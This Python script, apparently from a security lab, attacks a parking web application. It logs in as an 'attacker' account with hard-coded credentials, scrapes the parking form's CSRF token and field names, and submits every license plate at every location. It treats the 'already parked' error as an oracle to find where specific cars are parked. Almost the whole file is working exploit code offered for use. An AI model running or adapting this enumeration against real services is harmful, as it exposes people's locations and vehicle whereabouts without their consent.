#!/usr/bin/env python3
"""
attacker_parking_scraper.py

1) Log in via the navbar form on `/`
2) Scrape the parking form (action="/park") on the home page:
     • CSRF field name & value
     • text input name for license plate
     • number input name for minutes
     • select name for location + mapping label→value
3) For each plate × each location, POST to `/park`
4) Print only the “already parked” results
"""

import requests
from bs4 import BeautifulSoup

# ──────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────────────────────────────────────

BASE_URL      = 'http://localhost:3000'
ATTACKER_USER = 'attacker'
ATTACKER_PWD  = '-j!#9hdY2}WN$aM'

PLATES = ['ABC123']  # your list here
PARK_MINUTES = 1

# ──────────────────────────────────────────────────────────────────────────────
# LOGIN
# ──────────────────────────────────────────────────────────────────────────────

def login(session: requests.Session):
    # GET home page for CSRF + login form
    r = session.get(f'{BASE_URL}/')
    r.raise_for_status()
    soup = BeautifulSoup(r.text, 'html.parser')
    # CSRF hidden field (if any) in navbar form
    csrf = soup.find('input', {'name':'_csrf'})
    payload = {
        'username': ATTACKER_USER,
        'password': ATTACKER_PWD,
    }
    if csrf:
        payload['_csrf'] = csrf['value']

    # POST to /login
    r2 = session.post(f'{BASE_URL}/login', data=payload)
    r2.raise_for_status()
    print(f"[+] Logged in as {ATTACKER_USER}")

# ──────────────────────────────────────────────────────────────────────────────
# FORM INTROSPECTION
# ──────────────────────────────────────────────────────────────────────────────

def scrape_parking_form(session: requests.Session()):
    """
    GET / and find <form action="/park" method="post">.
    Extract:
      - csrf_name & csrf_value
      - license_input_name
      - minutes_input_name
      - location_select_name & {label: value} map
    """
    r = session.get(f'{BASE_URL}/')
    r.raise_for_status()
    soup = BeautifulSoup(r.text, 'html.parser')

    form = soup.find('form', {'action':'/park', 'method':'post'})
    if not form:
        raise RuntimeError("Could not locate parking form (action='/park').")

    # CSRF
    csrf_el = form.find('input', {'type':'hidden', 'name':True})
    csrf_name = csrf_el['name'] if csrf_el else None
    csrf_val  = csrf_el['value'] if csrf_el else None

    # License plate text input
    lic_el = form.find('input', {'type':'text', 'name':True})
    lic_name = lic_el['name']

    # Minutes number input
    min_el = form.find('input', {'type':'number', 'name':True})
    min_name = min_el['name']

    # Location select
    sel = form.find('select', {'name':True})
    loc_name = sel['name']
    loc_map = {opt.text.strip(): opt['value'] 
               for opt in sel.find_all('option') if opt.get('value')}

    return {
        'csrf_name':  csrf_name,
        'csrf_val':   csrf_val,
        'lic_name':   lic_name,
        'min_name':   min_name,
        'loc_name':   loc_name,
        'loc_map':    loc_map
    }

# ──────────────────────────────────────────────────────────────────────────────
# PARKING PROBE
# ──────────────────────────────────────────────────────────────────────────────

def check_parked(session, form_info, plate, loc_value):
    # 1) GET / to fetch CSRF + form
    r = session.get(BASE_URL + '/')
    r.raise_for_status()
    soup = BeautifulSoup(r.text, 'html.parser')

    # 2) extract CSRF (if any)
    token_el = soup.find('input', {'name': form_info['csrf_name']})
    csrf_val = token_el['value'] if token_el else None

    # 3) build and POST the form
    payload = {
        form_info['lic_name']:  plate,
        form_info['min_name']:  str(PARK_MINUTES),
        form_info['loc_name']:  loc_value,
    }
    if form_info['csrf_name']:
        payload[form_info['csrf_name']] = csrf_val

    r2 = session.post(BASE_URL + '/park', data=payload)
    r2.raise_for_status()

    # 4) look for the “already parked” error flash
    soup2 = BeautifulSoup(r2.text, 'html.parser')
    err = soup2.find('div', class_='alert-danger')
    if err and 'this car is already parked in the selected location' in err.get_text().lower():
        return True
    return False


# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────

def main():
    session = requests.Session()
    login(session)

    print("[+] Scraping parking form…")
    info = scrape_parking_form(session)
    print(f"    CSRF input:    {info['csrf_name']}")
    print(f"    Plate field:   {info['lic_name']}")
    print(f"    Minutes field: {info['min_name']}")
    print(f"    Location field:{info['loc_name']}")
    print(f"    {len(info['loc_map'])} locations found")

    print(f"\n[+] Probing {len(PLATES)} plates × {len(info['loc_map'])} locations …\n")
    for plate in PLATES:
        for loc_label, loc_value in info['loc_map'].items():
            try:
                if check_parked(session, info, plate, loc_value):
                    print(f"[ACTIVE] Plate {plate} is parked at '{loc_label}'")
            except Exception as e:
                print(f"[ERROR] {plate} @ '{loc_label}': {e}")

    print("\nDone.")

if __name__ == '__main__':
    main()
